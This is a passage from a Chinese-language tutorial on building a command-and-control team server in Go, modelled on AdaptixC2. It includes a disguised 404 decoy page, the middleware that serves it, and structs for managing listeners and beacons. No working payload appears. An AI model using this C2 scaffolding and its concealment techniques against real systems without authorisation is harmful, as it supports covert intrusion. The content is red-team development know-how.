class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span> /&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>404 | AdaptixC2<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css">        <span class="selector-pseudo">:root</span> &#123;  </span></span><br><span class="line"><span class="language-css">            <span class="attr">--bg</span>: <span class="number">#0a0a0a</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attr">--accent</span>: <span class="number">#00f0ff</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attr">--text</span>: <span class="number">#ffffff</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attr">--error</span>: <span class="number">#ff005c</span>;  </span></span><br><span class="line"><span class="language-css">        &#125;  </span></span><br><span class="line"><span class="language-css">  </span></span><br><span class="line"><span class="language-css">        * &#123;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-sizing</span>: border-box;  </span></span><br><span class="line"><span class="language-css">        &#125;  </span></span><br><span class="line"><span class="language-css">  </span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100vh</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">justify-content</span>: center;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(<span class="number">135deg</span>, <span class="built_in">var</span>(--bg) <span class="number">0%</span>, <span class="number">#111</span> <span class="number">100%</span>);  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: <span class="string">&quot;Segoe UI&quot;</span>, Arial, sans-serif;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="built_in">var</span>(--text);  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow</span>: hidden;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;  </span></span><br><span class="line"><span class="language-css">        &#125;  </span></span><br><span class="line"><span class="language-css">  </span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 背景浮动粒子 */</span>        <span class="selector-class">.particles</span> &#123;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100%</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">pointer-events</span>: none;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">z-index</span>: <span class="number">0</span>;  </span></span><br><span class="line"><span class="language-css">        &#125;  </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.particles</span> <span class="selector-tag">span</span> &#123;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">2px</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">2px</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="built_in">var</span>(--accent);  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">50%</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">opacity</span>: <span class="number">0.5</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation</span>: float <span class="number">12s</span> linear infinite;  </span></span><br><span class="line"><span class="language-css">        &#125;  </span></span><br><span class="line"><span class="language-css">        <span class="keyword">@keyframes</span> float &#123;  </span></span><br><span class="line"><span class="language-css">            <span class="number">0%</span> &#123; <span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">100vh</span>) <span class="built_in">scale</span>(<span class="number">1</span>); <span class="attribute">opacity</span>: <span class="number">0</span>; &#125;  </span></span><br><span class="line"><span class="language-css">            <span class="number">10%</span> &#123; <span class="attribute">opacity</span>: <span class="number">1</span>; &#125;  </span></span><br><span class="line"><span class="language-css">            <span class="number">90%</span> &#123; <span class="attribute">opacity</span>: <span class="number">1</span>; &#125;  </span></span><br><span class="line"><span class="language-css">            <span class="number">100%</span> &#123; <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-<span class="number">100px</span>) <span class="built_in">scale</span>(<span class="number">0</span>); <span class="attribute">opacity</span>: <span class="number">0</span>; &#125;  </span></span><br><span class="line"><span class="language-css">        &#125;  </span></span><br><span class="line"><span class="language-css">  </span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 主内容卡片 */</span>        <span class="selector-class">.card</span> &#123;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">z-index</span>: <span class="number">1</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">60px</span> <span class="number">80px</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.03</span>);  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">240</span>, <span class="number">255</span>, <span class="number">0.2</span>);  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">12px</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">backdrop-filter</span>: <span class="built_in">blur</span>(<span class="number">10px</span>);  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">30px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">240</span>, <span class="number">255</span>, <span class="number">0.15</span>);  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation</span>: pulse <span class="number">2s</span> ease-in-out infinite alternate;  </span></span><br><span class="line"><span class="language-css">        &#125;  </span></span><br><span class="line"><span class="language-css">        <span class="keyword">@keyframes</span> pulse &#123;  </span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">from</span> &#123; <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">20px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">240</span>, <span class="number">255</span>, <span class="number">0.15</span>); &#125;  </span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">to</span>   &#123; <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">40px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">240</span>, <span class="number">255</span>, <span class="number">0.35</span>); &#125;  </span></span><br><span class="line"><span class="language-css">        &#125;  </span></span><br><span class="line"><span class="language-css">  </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.card</span> <span class="selector-tag">h1</span> &#123;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">72px</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: <span class="number">900</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">letter-spacing</span>: <span class="number">4px</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(<span class="number">90deg</span>, <span class="built_in">var</span>(--error), <span class="built_in">var</span>(--accent));  </span></span><br><span class="line"><span class="language-css">            -webkit-<span class="attribute">background-clip</span>: text;  </span></span><br><span class="line"><span class="language-css">            -webkit-<span class="selector-tag">text</span>-<span class="attribute">fill</span>-<span class="attribute">color</span>: transparent;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">10px</span>;  </span></span><br><span class="line"><span class="language-css">        &#125;  </span></span><br><span class="line"><span class="language-css">  </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.card</span> <span class="selector-tag">p</span> &#123;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">18px</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">opacity</span>: <span class="number">0.8</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">30px</span>;  </span></span><br><span class="line"><span class="language-css">        &#125;  </span></span><br><span class="line"><span class="language-css">  </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.card</span> <span class="selector-tag">a</span> &#123;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: inline-block;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">12px</span> <span class="number">28px</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="built_in">var</span>(--accent);  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">30px</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="built_in">var</span>(--accent);  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: <span class="number">600</span>;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-decoration</span>: none;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">transition</span>: background <span class="number">0.3s</span>, color <span class="number">0.3s</span>;  </span></span><br><span class="line"><span class="language-css">        &#125;  </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.card</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="built_in">var</span>(--accent);  </span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="built_in">var</span>(--bg);  </span></span><br><span class="line"><span class="language-css">        &#125;  </span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">&lt;!-- 浮动粒子 --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;particles&quot;</span> <span class="attr">id</span>=<span class="string">&quot;particles&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">&lt;!-- 主卡片 --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>You need to enter the correct connection details.<span class="tag">&lt;/<span class="name">p</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>Back to Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">&lt;!-- 动态生成粒子 --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> particles = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;particles&#x27;</span>);  </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">60</span>; i++) &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> span = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;span&#x27;</span>);  </span></span><br><span class="line"><span class="language-javascript">        span.<span class="property">style</span>.<span class="property">left</span> = <span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">100</span> + <span class="string">&#x27;%&#x27;</span>;  </span></span><br><span class="line"><span class="language-javascript">        span.<span class="property">style</span>.<span class="property">animationDelay</span> = <span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">12</span> + <span class="string">&#x27;s&#x27;</span>;  </span></span><br><span class="line"><span class="language-javascript">        span.<span class="property">style</span>.<span class="property">animationDuration</span> = <span class="number">8</span> + <span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">10</span> + <span class="string">&#x27;s&#x27;</span>;  </span></span><br><span class="line"><span class="language-javascript">        particles.<span class="title function_">appendChild</span>(span);  </span></span><br><span class="line"><span class="language-javascript">    &#125;  </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>middlewares/404.go</code>访问不存在的路由时返回自定义的404hmtl页面</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> middlewares  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/profile&quot;</span>  </span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Default404Middleware</span><span class="params">(config profile.ServerResponseConfig)</span></span> gin.HandlerFunc &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;  </span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(c.Errors) &gt; <span class="number">0</span> &amp;&amp; !c.Writer.Written() &#123;  </span><br><span class="line">          <span class="keyword">for</span> header, value := <span class="keyword">range</span> config.Headers &#123;  </span><br><span class="line">             c.Header(header, value)  </span><br><span class="line">          &#125;  </span><br><span class="line">          c.String(config.Status, config.Page)  </span><br><span class="line">          c.Abort()  </span><br><span class="line">          <span class="keyword">return</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       c.Next()  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(c.Errors) &gt; <span class="number">0</span> &amp;&amp; !c.Writer.Written() &#123;  </span><br><span class="line">          <span class="keyword">for</span> header, value := <span class="keyword">range</span> config.Headers &#123;  </span><br><span class="line">             c.Header(header, value)  </span><br><span class="line">          &#125;  </span><br><span class="line">          c.String(config.Status, config.Page)  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-5-服务器启动"><a href="#1-5-服务器启动" class="headerlink" title="1.5 服务器启动"></a>1.5 服务器启动</h2><p>启动流程：</p>
<ol>
<li>通过NewTeamServer返回一个TeamServer对象</li>
<li><strong>TeamServer.Start</strong>：创建一个goroutine启动服务器，传递 <code>stopped</code> 通道的地址，以便 <code>StartServer</code> 方法可以在接收到停止信号时优雅地关闭服务。</li>
<li><strong>Controller.StartServer</strong>：用于启动 HTTPS服务并处理服务。</li>
</ol>
<p><code>server/types.go</code>：定义一个TeamServer结构体，负责管理配置、启动HTTP服务、管理监听器和Beacon，以及协调业务逻辑</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> server  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/controller&quot;</span>  </span><br><span class="line">    <span class="string">&quot;OneServer/handler&quot;</span>    </span><br><span class="line">    <span class="string">&quot;OneServer/profile&quot;</span>    </span><br><span class="line">    <span class="string">&quot;OneServer/utils/safeType&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> TeamServer <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Profile    *profile.Profile  </span><br><span class="line">    Controller *controller.Controller  </span><br><span class="line">    Listeners  safeType.Map  </span><br><span class="line">    Beacons    safeType.Map  </span><br><span class="line">    Handler    *handler.Handler  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>utils/safeType/map.go</code> 加上“锁”的map类型，避免资源竞争而导致的安全问题</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> safeType  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;sync&quot;</span>  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> Map <span class="keyword">struct</span> &#123;  </span><br><span class="line">    mutex sync.RWMutex  </span><br><span class="line">    m     <span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewMap</span><span class="params">()</span></span> Map &#123;  </span><br><span class="line">    <span class="keyword">return</span> Map&#123;  </span><br><span class="line">       m: <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;),  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Map)</span></span> Contains(key <span class="type">string</span>) <span class="type">bool</span> &#123;  </span><br><span class="line">    s.mutex.RLock()  </span><br><span class="line">    <span class="keyword">defer</span> s.mutex.RUnlock()  </span><br><span class="line">    _, exists := s.m[key]  </span><br><span class="line">    <span class="keyword">return</span> exists  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Map)</span></span> Put(key <span class="type">string</span>, value <span class="keyword">interface</span>&#123;&#125;) &#123;  </span><br><span class="line">    s.mutex.Lock()  </span><br><span class="line">    <span class="keyword">defer</span> s.mutex.Unlock()  </span><br><span class="line">    s.m[key] = value  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Map)</span></span> Get(key <span class="type">string</span>) (<span class="keyword">interface</span>&#123;&#125;, <span class="type">bool</span>) &#123;  </span><br><span class="line">    s.mutex.RLock()  </span><br><span class="line">    <span class="keyword">defer</span> s.mutex.RUnlock()  </span><br><span class="line">    value, exists := s.m[key]  </span><br><span class="line">    <span class="keyword">return</span> value, exists  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Map)</span></span> Delete(key <span class="type">string</span>) &#123;  </span><br><span class="line">    s.mutex.Lock()  </span><br><span class="line">    <span class="keyword">defer</span> s.mutex.Unlock()  </span><br><span class="line">    <span class="built_in">delete</span>(s.m, key)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Map)</span></span> GetDelete(key <span class="type">string</span>) (<span class="keyword">interface</span>&#123;&#125;, <span class="type">bool</span>) &#123;  </span><br><span class="line">    s.mutex.Lock()  </span><br><span class="line">    <span class="keyword">defer</span> s.mutex.Unlock()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> value, exists := s.m[key]; exists &#123;  </span><br><span class="line">       <span class="built_in">delete</span>(s.m, key)  </span><br><span class="line">       <span class="keyword">return</span> value, <span class="literal">true</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">false</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Map)</span></span> Len() <span class="type">int</span> &#123;  </span><br><span class="line">    s.mutex.RLock()  </span><br><span class="line">    <span class="keyword">defer</span> s.mutex.RUnlock()  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(s.m)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Map)</span></span> ForEach(f <span class="function"><span class="keyword">func</span><span class="params">(key <span class="type">string</span>, value <span class="keyword">interface</span>&#123;&#125;)</span></span> <span class="type">bool</span>) &#123;  </span><br><span class="line">    s.mutex.RLock()  </span><br><span class="line">    copyMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;, <span class="built_in">len</span>(s.m))  </span><br><span class="line">    <span class="keyword">for</span> k, v := <span class="keyword">range</span> s.m &#123;  </span><br><span class="line">       copyMap[k] = v  </span><br><span class="line">    &#125;  </span><br><span class="line">    s.mutex.RUnlock()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> key, value := <span class="keyword">range</span> copyMap &#123;  </span><br><span class="line">       <span class="keyword">if</span> !f(key, value) &#123;  </span><br><span class="line">          <span class="keyword">break</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Map)</span></span> DirectLock() &#123;  </span><br><span class="line">    s.mutex.RLock()  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Map)</span></span> DirectUnlock() &#123;  </span><br><span class="line">    s.mutex.RUnlock()  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Map)</span></span> DirectMap() <span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125; &#123;  </span><br><span class="line">    <span class="keyword">return</span> s.m  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Map)</span></span> CutMap() <span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125; &#123;  </span><br><span class="line">    s.mutex.Lock()  </span><br><span class="line">    <span class="keyword">defer</span> s.mutex.Unlock()  </span><br><span class="line">  </span><br><span class="line">    oldMap := s.m  </span><br><span class="line">    s.m = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> oldMap  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/types.go</code> 后续再补充需要用到的接口方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> handler  </span><br><span class="line">   </span><br><span class="line"><span class="keyword">type</span> ListenerHandler <span class="keyword">interface</span> &#123;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> BeaconHandler <span class="keyword">interface</span> &#123;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> Handler <span class="keyword">struct</span> &#123;  </span><br><span class="line">    ListenerHandlers <span class="keyword">map</span>[<span class="type">string</span>]ListenerHandler  </span><br><span class="line">    BeaconHandlers   <span class="keyword">map</span>[<span class="type">string</span>]BeaconHandler  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>server/teamserver.go</code>：包含NewTeamServer、SetProfile、Start方法</p>
